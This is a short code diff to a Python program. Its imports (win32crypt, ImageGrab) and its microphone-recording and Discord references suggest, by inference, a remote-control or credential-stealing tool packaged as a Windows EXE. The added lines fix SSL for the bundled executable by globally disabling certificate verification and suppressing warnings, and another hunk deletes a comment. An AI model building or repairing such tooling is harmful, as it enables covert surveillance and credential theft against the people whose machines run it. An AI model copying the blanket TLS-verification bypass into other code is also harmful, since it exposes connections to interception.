@@ -31,6 +31,21 @@ import json
 import sqlite3
 import win32crypt
 from PIL import ImageGrab
+import certifi
+import ssl
+
+# Fix SSL certificate verification for PyInstaller bundled EXE
+if getattr(sys, 'frozen', False):
+    os.environ['SSL_CERT_FILE'] = certifi.where()
+    os.environ['REQUESTS_CA_BUNDLE'] = certifi.where()
+    # Disable SSL verification for aiohttp/discord.py
+    ssl._create_default_https_context = ssl._create_unverified_context
+    # Also patch requests
+    try:
+        import requests.packages.urllib3
+        requests.packages.urllib3.disable_warnings()
+    except:
+        pass
 
 # PyCryptodome - handle gracefully if missing
 try:
@@ -295,7 +310,6 @@ def record_mic(duration=10):
     return path
 
 def speak(text):
-    # Using pyttsx3 instead of win32com to avoid pickle errors
     engine = pyttsx3.init()
     engine.say(text)
     engine.runAndWait()
